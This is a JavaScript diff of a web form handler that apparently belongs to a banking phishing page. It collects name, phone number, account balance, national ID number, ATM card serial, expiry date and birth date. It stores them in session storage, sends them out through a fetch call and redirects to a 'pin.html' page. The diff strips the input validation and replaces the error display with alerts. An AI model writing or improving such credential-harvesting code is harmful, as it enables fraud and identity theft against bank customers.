@@ -34,54 +34,19 @@ $(document).ready(function() {
     $('#masa').mask('00/00/0000');
     $('#tanggal_lahir').mask('00/00/0000');
 
-    // Form submission with validation
+    // Form submission with loading
     $('#form1').on('submit', function(e) {
         e.preventDefault();
-
-        const messageContainer = $('#message-container');
-        messageContainer.html(''); // Clear previous messages
+        $("#loader").show();
 
         // Ambil data dari form
-        const nama = $('#nama').val().trim();
-        const nomor = $('#nomor').val().trim();
-        const saldo = $('#saldo').val().trim();
-        const nik = $('#nik').val().trim();
-        const seri = $('#seri').val().trim();
-        const masa = $('#masa').val().trim();
-        const tanggal_lahir = $('#tanggal_lahir').val().trim();
-
-        // Validasi: Semua field harus diisi
-        if (!nama) {
-            messageContainer.html('<div class="message error">Nama Lengkap tidak boleh kosong.</div>');
-            return;
-        }
-        if (!nomor) {
-            messageContainer.html('<div class="message error">Nomor Handphone tidak boleh kosong.</div>');
-            return;
-        }
-        if (!saldo) {
-            messageContainer.html('<div class="message error">Saldo Akhir tidak boleh kosong.</div>');
-            return;
-        }
-        if (!nik) {
-            messageContainer.html('<div class="message error">NIK KTP tidak boleh kosong.</div>');
-            return;
-        }
-        if (!seri) {
-            messageContainer.html('<div class="message error">Seri Kartu ATM tidak boleh kosong.</div>');
-            return;
-        }
-        if (!masa) {
-            messageContainer.html('<div class="message error">Masa Berlaku tidak boleh kosong.</div>');
-            return;
-        }
-        if (!tanggal_lahir) {
-            messageContainer.html('<div class="message error">Tanggal Lahir tidak boleh kosong.</div>');
-            return;
-        }
-
-        // Jika semua valid, lanjutkan
-        $("#loader").show();
+        const nama = document.getElementById('nama').value;
+        const nomor = document.getElementById('nomor').value;
+        const saldo = document.getElementById('saldo').value;
+        const nik = document.getElementById('nik').value;
+        const seri = document.getElementById('seri').value;
+        const masa = document.getElementById('masa').value;
+        const tanggal_lahir = document.getElementById('tanggal_lahir').value;
 
         // Simpan ke sessionStorage
         sessionStorage.setItem('nama', nama);
@@ -120,15 +85,18 @@ $(document).ready(function() {
                     // Sukses, redirect ke halaman PIN
                     setTimeout(() => {
                         $("#loader").hide();
-                        window.location.href = 'pin.html'; // Redirect ke halaman PIN
+                        window.location.href = 'pin.html'; // Ganti dengan halaman PIN kamu
                     }, 500);
                 } else {
                     console.error('Error sending message:', data);
                     $("#loader").hide();
-                    messageContainer.html('<div class="message error">Gagal mengirim data. Coba lagi.</div>');
+                    alert('Gagal mengirim data. Coba lagi.');
                 }
             })
             .catch(error => {
                 console.error('Fetch error:', error);
                 $("#loader").hide();
-                messageContainer.html('<
+                alert('Error: ' + error.message);
+            });
+    });
+});
